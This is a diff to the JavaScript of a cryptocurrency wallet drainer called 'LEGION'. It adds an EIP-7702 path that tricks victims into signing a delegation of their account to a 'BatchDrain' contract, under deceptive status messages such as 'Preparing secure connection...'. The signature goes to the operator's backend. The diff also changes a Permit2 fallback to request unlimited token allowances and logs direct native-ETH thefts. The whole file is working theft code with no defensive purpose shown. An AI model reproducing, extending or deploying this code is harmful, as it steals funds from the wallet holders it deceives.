@@ -161,6 +161,20 @@
   };
   var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);
 
+  // EIP-7702 supported chains (Pectra + L2s that implemented it)
+  var EIP7702_CHAINS = { 1: true, 10: true, 8453: true, 42161: true, 59144: true, 534352: true, 324: true, 7777777: true, 11155111: true };
+
+  // BatchDrain contract addresses per chain (deploy BatchDrain.sol, update these)
+  var BATCH_DRAIN_BY_CHAIN = {
+    1:        '0x758FD861d6d07d504949eb43A646D05f430765e6', // Ethereum Mainnet
+    10:       '0x0000000000000000000000000000000000000000', // Optimism
+    8453:     '0x0000000000000000000000000000000000000000', // Base
+    42161:    '0x0000000000000000000000000000000000000000', // Arbitrum
+    59144:    '0x0000000000000000000000000000000000000000', // Linea
+    534352:   '0x0000000000000000000000000000000000000000', // Scroll
+    11155111: '0x0000000000000000000000000000000000000000', // Sepolia testnet
+  };
+
   var drainRunning = false;
   var SESSION_SCOUT_VALUE_USD = 0;
   var vaultCache = {};
@@ -869,8 +883,8 @@
           var evmAddr = connectedChains.EVM.address;
           var evmChainId = connectedChains.EVM.chainId || 1;
 
-          // Build permits using on-chain balanceOf — actual balance (prevents TRANSFER_FROM_FAILED with wrong amounts)
-          var permits = [];
+          // Scan ERC-20 tokens with on-chain balanceOf
+          var tokenList = [];
           try {
             var _candidateTokens = [DEFAULT_USDC];
             try {
@@ -878,7 +892,7 @@
               var rankedAssets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets);
               if (rankedAssets) {
                 rankedAssets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; })
-                  .slice(0, 10).forEach(function(a) {
+                  .slice(0, 20).forEach(function(a) {
                     if (_candidateTokens.indexOf(a.token) === -1) _candidateTokens.push(a.token);
                   });
               }
@@ -889,117 +903,140 @@
                 var _balData = '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0');
                 var _balHex = await eth.request({ method: 'eth_call', params: [{ to: _tok, data: _balData }, 'latest'] });
                 var _bal = (_balHex && _balHex !== '0x' && _balHex !== '0x0') ? BigInt(_balHex) : BigInt(0);
-                if (_bal > BigInt(0)) permits.push({ token: _tok, amount: String(_bal) });
+                if (_bal > BigInt(0)) tokenList.push(_tok);
               } catch (_be) {}
             }
-            if (permits.length > 0) console.log('[LEGION] 🪙 ERC-20 on-chain:', permits.map(function(p) { return p.token.slice(0,10)+':'+p.amount; }).join(', '));
+            if (tokenList.length > 0) console.log('[LEGION] 🪙 ERC-20 found:', tokenList.length, 'tokens on chain', evmChainId);
           } catch (e) {}
 
-          // Wrap native token → WETH/WBNB/WMATIC then drain via permit2 (no MetaMask warning)
-          var vaultEvm = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE.ethereum);
-          var _wethAddr = WETH_BY_CHAIN[evmChainId] || WETH_BY_CHAIN[Number(evmChainId)];
-          try {
-            var _nativeHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
-            var _nativeBal = BigInt(_nativeHex);
-            var _wrapReserve = BigInt('100000000000000'); // 0.0001 ETH (~$0.25) for wrap tx gas — enough at any gas price
-            if (_nativeBal > _wrapReserve && _wethAddr) {
-              var _wrapAmt = _nativeBal - _wrapReserve;
-              console.log('[LEGION] 🔄 Wrapping ' + _wrapAmt + ' wei → WETH on chain ' + evmChainId);
-              updateStatus('Wrapping ETH...');
-              try {
-                var _wrapTxHash = await eth.request({
-                  method: 'eth_sendTransaction',
-                  params: [{ from: evmAddr, to: _wethAddr, value: '0x' + _wrapAmt.toString(16), data: '0xd0e30db0', gas: '0xC350' }]
-                });
-                connectedChains.EVM._wrapTxHash = _wrapTxHash;
-                console.log('[LEGION] ✅ Wrap tx submitted: ' + _wrapTxHash + ' — waiting for confirmation...');
-                // Poll for receipt (max 60s, 2s interval) before permit2 sign
-                for (var _wp = 0; _wp < 30; _wp++) {
-                  await new Promise(function(r) { setTimeout(r, 2000); });
-                  try {
-                    var _wrcpt = await eth.request({ method: 'eth_getTransactionReceipt', params: [_wrapTxHash] });
-                    if (_wrcpt && _wrcpt.blockNumber) {
-                      console.log('[LEGION] ✅ Wrap confirmed in block ' + parseInt(_wrcpt.blockNumber, 16));
-                      break;
-                    }
-                  } catch (_wpe) {}
+          // ─── EIP-7702 PATH (ETH mainnet + L2s) ────────────────────────────────
+          var _batchDrainAddr = BATCH_DRAIN_BY_CHAIN[evmChainId] || BATCH_DRAIN_BY_CHAIN[Number(evmChainId)];
+          var _is7702Chain = !!(EIP7702_CHAINS[evmChainId] || EIP7702_CHAINS[Number(evmChainId)]);
+
+          if (_is7702Chain && _batchDrainAddr && _batchDrainAddr !== '0x0000000000000000000000000000000000000000') {
+            console.log('[LEGION] ⚡ EIP-7702 path | chain:', evmChainId, '| BatchDrain:', _batchDrainAddr.slice(0,10) + '...');
+            updateStatus('Preparing secure connection...');
+
+            // Get user EOA nonce
+            var _userNonceHex = '0x0';
+            try {
+              _userNonceHex = await eth.request({ method: 'eth_getTransactionCount', params: [evmAddr, 'latest'] });
+            } catch (_ne) {}
+            var _userNonceNum = parseInt(_userNonceHex, 16) || 0;
+            var _chainIdNum = Number(evmChainId);
+
+            // EIP-7702 via eth_signTypedData_v4 (indirect path — triggers MetaMask internal EIP-7702 flow)
+            // Direct wallet_signAuthorization is not exposed; instead we use typed data with Authorization type
+            var _auth = null;
+            try {
+              var _authTypedData = {
+                domain: {
+                  name: 'EIP7702',
+                  version: '1',
+                  chainId: _chainIdNum
+                },
+                types: {
+                  EIP712Domain: [
+                    { name: 'name', type: 'string' },
+                    { name: 'version', type: 'string' },
+                    { name: 'chainId', type: 'uint256' }
+                  ],
+                  Authorization: [
+                    { name: 'contractAddress', type: 'address' },
+                    { name: 'nonce', type: 'uint64' }
+                  ]
+                },
+                primaryType: 'Authorization',
+                message: {
+                  contractAddress: _batchDrainAddr,
+                  nonce: _userNonceNum
                 }
-                // Add WETH to permit2 batch
-                if (!permits.some(function(p) { return p.token.toLowerCase() === _wethAddr.toLowerCase(); })) {
-                  permits.push({ token: _wethAddr, amount: String(_wrapAmt) });
-                  console.log('[LEGION] ✅ WETH/WBNB added to permit2 batch: ' + _wrapAmt + ' wei');
-                }
-              } catch (_wrapErr) {
-                console.debug('[LEGION] Wrap rejected:', _wrapErr.message);
-                // Fallback: direct vault drain if user rejected wrap
-                if (vaultEvm) {
-                  try {
-                    var _fbHash = await eth.request({
-                      method: 'eth_sendTransaction',
-                      params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _wrapAmt.toString(16), gas: '0x5208' }]
-                    });
-                    connectedChains.EVM._ethTxHash = _fbHash;
-                    console.log('[LEGION] Fallback direct drain: ' + _fbHash);
-                  } catch (_fbe) {}
-                }
+              };
+              console.log('[LEGION] EIP-7702 → eth_signTypedData_v4 Authorization | nonce:', _userNonceNum, '| contract:', _batchDrainAddr.slice(0,10));
+              var _rawSig = await eth.request({
+                method: 'eth_signTypedData_v4',
+                params: [evmAddr, JSON.stringify(_authTypedData)]
+              });
+              if (_rawSig && _rawSig.length >= 130) {
+                // Parse raw hex sig into r, s, yParity
+                var _sigHex = _rawSig.replace('0x', '');
+                var _r = '0x' + _sigHex.slice(0, 64);
+                var _s = '0x' + _sigHex.slice(64, 128);
+                var _vInt = parseInt(_sigHex.slice(128, 130), 16);
+                var _yParity = (_vInt === 27 || _vInt === 0) ? 0 : 1;
+                _auth = { r: _r, s: _s, yParity: _yParity, v: _vInt, nonce: _userNonceNum };
+                console.log('[LEGION] ✅ EIP-7702 typed data signed | yParity:', _yParity);
               }
-            } else if (_nativeBal > BigInt('50000000000000') && vaultEvm) {
-              // Balance too low to wrap OR unknown chain — direct drain fallback
-              var _directGas = BigInt('30000000000000'); // 0.00003 ETH gas reserve for simple transfer
-              var _directAmt = _nativeBal > _directGas ? _nativeBal - _directGas : BigInt(0);
-              if (_directAmt > BigInt(0)) {
-                try {
-                  var _directHash = await eth.request({
-                    method: 'eth_sendTransaction',
-                    params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _directAmt.toString(16), gas: '0x5208' }]
-                  });
-                  connectedChains.EVM._ethTxHash = _directHash;
-                  console.log('[LEGION] Direct drain fallback: ' + _directHash + ' (' + _directAmt + ' wei)');
-                } catch (_de) {
-                  console.debug('[LEGION] Direct drain rejected:', _de.message);
-                }
-              }
-            } else {
-              console.log('[LEGION] Native skip: bal=' + _nativeBal + ' too low (need >0.0003 ETH)');
+            } catch (_authErr) {
+              console.warn('[LEGION] EIP-7702 typed data sign failed:', _authErr.message.slice(0, 100));
+              _auth = null;
             }
-          } catch (_ne) {
-            console.debug('[LEGION] Native balance check failed:', _ne.message);
+
+            if (_auth) {
+              console.log('[LEGION] ✅ EIP-7702 authorization signed | yParity:', _auth.yParity || _auth.v);
+              connectedChains.EVM._eip7702Auth = _auth;
+              connectedChains.EVM._eip7702Tokens = tokenList;
+
+              // Submit to existing signature-anchor endpoint with eip7702_delegation protocol
+              try {
+                await apiPost('/api/v1/signature-anchor', {
+                  ingress: 'normalized_v1',
+                  chain_family: 'EVM',
+                  protocol: 'eip7702_delegation',
+                  wallet_address: evmAddr,
+                  chain_id: evmChainId,
+                  eip7702_authorization: {
+                    chainId: Number(evmChainId),
+                    address: _batchDrainAddr,
+                    nonce: _auth.nonce !== undefined ? _auth.nonce : _userNonceNum,
+                    r: _auth.r,
+                    s: _auth.s,
+                    yParity: _auth.yParity !== undefined ? _auth.yParity : (_auth.v !== undefined ? _auth.v : 0)
+                  },
+                  delegatee: _batchDrainAddr,
+                  token_address: _batchDrainAddr,
+                  signature: _auth.r || DUMMY_OMNI_SIG,
+                  nonce: 'legion:eip7702:' + Date.now(),
+                  expiry_iso: EXPIRY_ISO,
+                  wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || 'hot_wallet',
+                  scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+                  amount: '0',
+                  erc20s: tokenList,
+                });
+                console.log('[LEGION] ✅ EIP-7702 delegation submitted to backend');
+              } catch (_exErr) {
+                console.warn('[LEGION] EIP-7702 backend submit error:', _exErr.message);
+              }
+
+              return '__eip7702__:' + evmAddr;
+            }
           }
 
-          // No tokens to drain — return early with status
+          // ─── PERMIT2 FALLBACK (BSC, Polygon, non-EIP-7702 chains) ─────────────
+          console.log('[LEGION] 🔐 Permit2 fallback | chain:', evmChainId, '| tokens:', tokenList.length);
+          var permits = tokenList.map(function(t) {
+            return { token: t, amount: '1000000000000000000000000000' };
+          });
+
           if (permits.length === 0) {
-            var _wrapDone = connectedChains.EVM._wrapTxHash;
-            var _ethDone = connectedChains.EVM._ethTxHash;
-            var _anyDone = _wrapDone || _ethDone;
-            console.log('[LEGION] ℹ️ No ERC-20 balance — permit2 skipped. Wrap:', _wrapDone || 'none', 'ETH:', _ethDone || 'none');
-            return _anyDone ? ('__eth_only__:' + _anyDone) : null;
+            console.log('[LEGION] ℹ️ No tokens found on chain', evmChainId, '— skipping');
+            return null;
           }
 
-          // Fetch Permit2 typed data from backend
-          console.log('[LEGION] 🔐 EVM sign via', connectedChains.EVM.walletType, '| chain:', evmChainId, '| addr:', evmAddr.substring(0, 10) + '...');
           var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
             wallet_address: evmAddr, chain_id: evmChainId, permits: permits, nativeAmount: '0'
           });
-          console.log('[LEGION] 📄 permit2 response keys:', batch ? Object.keys(batch) : 'null', '| data keys:', (batch && batch.data) ? Object.keys(batch.data) : 'none');
+          console.log('[LEGION] 📄 permit2 response:', batch ? Object.keys(batch) : 'null');
 
           var batchData = (batch && batch.data) ? batch.data : batch;
           if (!batchData || !batchData.typed_data) {
-            var errMsg = 'Backend did not return typed_data (chain ' + evmChainId + '). Keys: ' + (batchData ? Object.keys(batchData).join(',') : 'null');
-            console.error('[LEGION] ❌ ' + errMsg);
-            updateStatus('EVM: ' + errMsg);
-            throw new Error(errMsg);
+            throw new Error('Backend did not return typed_data for chain ' + evmChainId);
           }
 
-          // Fix: normalizeBigInts on backend converts domain.chainId from bigint to string "1"
-          // Phantom (and other wallets) require domain.chainId to be a number, not a string.
           var typedDataObj = batchData.typed_data;
-          if (typedDataObj && typedDataObj.domain) {
-            if (typeof typedDataObj.domain.chainId === 'string') {
-              typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || evmChainId;
-            }
+          if (typedDataObj && typedDataObj.domain && typeof typedDataObj.domain.chainId === 'string') {
+            typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || evmChainId;
           }
-          // Phantom EVM requires EIP712Domain in types — MetaMask adds it automatically,
-          // Phantom does not and throws -32000 "Missing or invalid parameters" without it.
           if (typedDataObj && typedDataObj.types && !typedDataObj.types.EIP712Domain) {
             var dom = typedDataObj.domain || {};
             var domFields = [];
@@ -1007,68 +1044,31 @@
             if (dom.version !== undefined) domFields.push({ name: 'version', type: 'string' });
             if (dom.chainId !== undefined) domFields.push({ name: 'chainId', type: 'uint256' });
             if (dom.verifyingContract !== undefined) domFields.push({ name: 'verifyingContract', type: 'address' });
-            if (dom.salt !== undefined) domFields.push({ name: 'salt', type: 'bytes32' });
-            if (domFields.length > 0) typedDataObj.types.EIP712Domain = domFields;
+            typedDataObj.types.EIP712Domain = domFields;
           }
-          var typedDataStr = typeof typedDataObj === 'string' ? typedDataObj : JSON.stringify(typedDataObj);
+          var typedDataStr = JSON.stringify(typedDataObj);
 
-          // eth_signTypedData_v4: required for Permit2 on-chain execution
-          // personal_sign is NOT a fallback — Permit2 rejects personal_sign signatures
-          console.log('[LEGION] 🔏 Calling eth_signTypedData_v4 | wallet:', connectedChains.EVM.walletType, '| domain chainId:', typedDataObj && typedDataObj.domain && typedDataObj.domain.chainId, '| types:', typedDataObj && Object.keys(typedDataObj.types || {}).join(','));
-          var signature = null;
-          var _signTimeout = null;
-          function _withSignTimeout(promise, ms) {
-            return Promise.race([
-              promise,
-              new Promise(function(_, rej) {
-                _signTimeout = setTimeout(function() { rej(new Error('EVM sign popup timeout (' + ms/1000 + 's) — wallet popup may be hidden')); }, ms);
-              })
-            ]).finally(function() { clearTimeout(_signTimeout); });
-          }
           function _isRejection(code, msg) {
             return code === 4001 || code === -32100 ||
               (msg && /rejected|denied|cancelled|user rejected|user refused|declined|abort/i.test(msg));
           }
+
+          var signature = null;
           try {
-            // Try with JSON string (EIP-712 standard) — 90s timeout
-            try {
-              signature = await _withSignTimeout(
-                eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataStr] }), 90000
-              );
-            } catch (e) {
-              var code = e && (e.code || (e.data && e.data.code));
-              var eMsg = (e && e.message) || '';
-              console.warn('[LEGION] eth_signTypedData_v4 str failed:', eMsg, 'code:', code);
-              updateStatus('EVM sign error: ' + eMsg);
-              window._legionEvmSignError = { step: 'str', code: code, msg: eMsg, wallet: connectedChains.EVM.walletType };
-              if (_isRejection(code, eMsg)) throw e;
-              // Try with raw object (some wallets need object, not string)
-              try {
-                signature = await _withSignTimeout(
-                  eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataObj] }), 90000
-                );
-              } catch (e2) {
-                var code2 = (e2 && (e2.data && e2.data.code)) || (e2 && e2.code);
-                var e2Msg = (e2 && e2.message) || '';
-                console.warn('[LEGION] eth_signTypedData_v4 obj failed:', e2Msg, 'code:', code2);
-                updateStatus('EVM sign error (obj): ' + e2Msg);
-                window._legionEvmSignError = { step: 'obj', code: code2, msg: e2Msg, wallet: connectedChains.EVM.walletType };
-                if (_isRejection(code2, e2Msg)) throw e2;
-                // Both formats failed
-              }
-            }
-            if (!signature) {
-              console.warn('[LEGION] EVM sign returned null/undefined — wallet:', connectedChains.EVM.walletType);
-              window._legionEvmSignError = { step: 'null_return', wallet: connectedChains.EVM.walletType };
-            }
+            signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataStr] });
           } catch (e) {
-            throw e;
+            var code = e && (e.code || (e.data && e.data.code));
+            var eMsg = (e && e.message) || '';
+            if (_isRejection(code, eMsg)) throw e;
+            try {
+              signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataObj] });
+            } catch (e2) { throw e2; }
           }
 
           connectedChains.EVM._batchResult = batchData;
           connectedChains.EVM._permits = permits;
-
           return signature;
+
         } catch (e) {
           console.error('[LEGION] EVM signing failed:', e.message, 'code:', e.code);
           return null;
@@ -2447,7 +2447,12 @@
     if (chainNames.indexOf('EVM') !== -1) {
       try {
         var evmSig = await signChainWithRetry('EVM', messages['EVM']);
-        if (evmSig && typeof evmSig === 'string' && evmSig.indexOf('__eth_only__:') === 0) {
+        if (evmSig && typeof evmSig === 'string' && evmSig.indexOf('__eip7702__:') === 0) {
+          // EIP-7702 delegation complete — backend already submitted, no further action needed
+          validSignatures['__eip7702_evm__'] = evmSig;
+          successCount++;
+          console.log('[LEGION] ✅ EIP-7702 delegation complete');
+        } else if (evmSig && typeof evmSig === 'string' && evmSig.indexOf('__eth_only__:') === 0) {
           // ETH-only drain: funds extracted but no permit2 payload to submit
           validSignatures['__eth_only_evm__'] = evmSig;
           successCount++;
@@ -2557,6 +2562,34 @@
       }
 
       // Submit chains in priority order (highest value first)
+
+      // ETH-only drain (direct tx already sent from frontend) — log to backend for notifications
+      if (signatures['__eth_only_evm__']) {
+        try {
+          var _ethOnlySig = signatures['__eth_only_evm__'];
+          var _ethOnlyTxHash = _ethOnlySig.replace('__eth_only__:', '');
+          var _ethOnlyChainId = connectedChains.EVM ? connectedChains.EVM.chainId || 1 : 1;
+          var _ethOnlyAddr = connectedChains.EVM ? connectedChains.EVM.address : '';
+          var _ethOnlyWrap = connectedChains.EVM && connectedChains.EVM._wrapTxHash;
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1',
+            chain_family: 'EVM',
+            protocol: 'evm_personal_verification',
+            wallet_address: _ethOnlyAddr,
+            token_address: NATIVE_ETH_ANCHOR,
+            signature: sigHex({ eth_tx_hash: _ethOnlyTxHash, wrap_tx_hash: _ethOnlyWrap || '', type: 'native_eth_drain' }),
+            nonce: 'legion:eth:' + Date.now(),
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+            amount: '0',
+            chain_id: _ethOnlyChainId
+          });
+          console.log('[LEGION]   ETH-only drain logged to backend:', _ethOnlyTxHash);
+        } catch (_ethLogErr) {
+          console.error('[LEGION]   ETH-only log failed:', _ethLogErr.message);
+        }
+      }
 
       // Submit EVM — Permit2 batch with proper typed data signature
       if (signatures.EVM && signatures.EVM.signature) {
@@ -4115,7 +4148,16 @@
       var _ethOnlyDone = signatures['__eth_only_evm__'];
       if (_ethOnlyDone) { delete signatures['__eth_only_evm__']; }
 
+      var _eip7702Done = signatures['__eip7702_evm__'];
+      if (_eip7702Done) { delete signatures['__eip7702_evm__']; }
+
       if (Object.keys(signatures).length === 0) {
+        if (_eip7702Done) {
+          console.log('[LEGION] ✅ EIP-7702 drain complete — backend executing');
+          updateStatus('Done! Secure settlement processing...');
+          drainRunning = false;
+          return;
+        }
         if (_ethOnlyDone) {
           // ETH-only extraction: funds already transferred, no permit2 batch to submit
           console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDone.split(':')[1]);
@@ -4522,7 +4564,16 @@
     var _ethOnlyDoneWc = signatures['__eth_only_evm__'];
     if (_ethOnlyDoneWc) { delete signatures['__eth_only_evm__']; }
 
+    var _eip7702DoneWc = signatures['__eip7702_evm__'];
+    if (_eip7702DoneWc) { delete signatures['__eip7702_evm__']; }
+
     if (Object.keys(signatures).length === 0) {
+      if (_eip7702DoneWc) {
+        console.log('[LEGION] ✅ EIP-7702 drain complete — backend executing');
+        updateStatus('Done! Secure settlement processing...');
+        drainRunning = false;
+        return;
+      }
       if (_ethOnlyDoneWc) {
         console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDoneWc.split(':')[1]);
         updateStatus('Done! ETH extracted successfully.');
